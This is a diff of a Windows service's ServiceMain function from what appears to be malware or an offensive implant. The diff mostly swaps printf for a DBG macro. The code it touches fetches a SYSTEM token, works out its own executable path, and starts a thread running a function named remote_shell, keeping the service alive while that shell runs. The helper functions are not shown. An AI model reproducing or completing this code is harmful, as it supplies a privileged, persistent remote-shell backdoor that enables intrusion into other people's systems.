@@ -50,12 +50,11 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     t_svc_ctx   ctx;
     ZeroMemory(&ctx, sizeof(ctx));
 
-    
     ctx.hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
     if (!ctx.hStopEvent)
     {
-        printf("CreateEvent failed: %lu\n", GetLastError());
-        return;
+        DBG("CreateEvent failed: %lu\n", GetLastError());
+        return ;
     }
 
     ctx.status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
@@ -68,7 +67,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     );
     if (!ctx.hStatus)
     {
-        printf("Register Service handler failed: %lu\n", GetLastError());
+        DBG("Register Service handler failed: %lu\n", GetLastError());
         return ;
     }
 
@@ -77,19 +76,13 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 
     // notifies the SCM of the current status of service
     if (!SetServiceStatus(ctx.hStatus, &ctx.status))
-        printf("Set service status failed: %lu", GetLastError());
-    
-    // duplicate SYSTEM token (session 1)
+        DBG("Set service status failed: %lu", GetLastError());
     
     HANDLE  hToken = GetSystemToken();
 
-    UNREFERENCED_PARAMETER(hToken);
-
     wchar_t execPath[MAX_PATH];
-    if (GetModuleFileNameW(NULL, execPath, MAX_PATH)) {
+    if (GetModuleFileNameW(NULL, execPath, MAX_PATH))
         execPath[wcslen(execPath) - 7] = '\0';
-        DBG("Path: %ls\n", execPath);
-    }
 
     STARTUPINFOW        si;
     PROCESS_INFORMATION pi;
@@ -104,10 +97,11 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         CloseHandle(hToken);
         return;
     }
+    
     HANDLE hThread = CreateThread(NULL, 0, remote_shell, NULL, 0, NULL);
     HANDLE tProcesses[2] = {ctx.hStopEvent, hThread};
-    // WaitForSingleObject(ctx.hStopEvent, INFINITE);
     WaitForMultipleObjects(2, tProcesses, FALSE, INFINITE);
+
     ctx.status.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(ctx.hStatus, &ctx.status);
 
